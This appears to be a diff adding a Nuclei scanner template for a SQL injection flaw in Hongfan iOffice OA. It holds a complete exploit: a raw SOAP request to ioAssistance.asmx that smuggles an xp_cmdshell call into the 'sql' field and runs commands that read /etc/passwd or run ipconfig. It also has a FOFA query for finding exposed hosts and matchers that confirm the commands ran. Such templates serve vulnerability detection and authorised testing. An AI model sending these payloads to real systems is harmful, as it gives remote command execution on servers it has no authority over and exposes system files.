@@ -1,0 +1,56 @@
+id: hongfan-ioffice-rce
+
+info:
+  name: Hongfan OA ioAssistance.asmx - Remote Code Execution
+  author: SleepingBag945
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.
+  reference:
+    - https://github.com/FridaZhbk/pocscan/blob/main/%E7%BA%A2%E5%B8%86/oa%E7%BA%A2%E5%B8%86ioAssistance.asmx%E6%B3%A8%E5%85%A5RCE.py
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="红帆-ioffice"
+  tags: hongfan,oa,sqli
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+              <sql>exec master.dbo.xp_cmdshell '{{command}}'</sql>
+            </GetLoginedEmpNoReadedInf>
+          </soap:Body>
+        </soap:Envelope>
+
+    payloads:
+      command:
+        - '/bin/bash -c "cat /etc/passwd"'
+        - 'cmd /c ipconfig'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "root:.*:0:0:"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a0046304402204ded68549acb1c8ce427091ca0e522b79f5ed4fc439d5758d77e2b5c49cdbbe0022075f7926da7dca23e4d1fcd67fcd4614b69871045c158e0ad289d90bdd8d4317a:922c64590222798bb761d5b6d8e72950
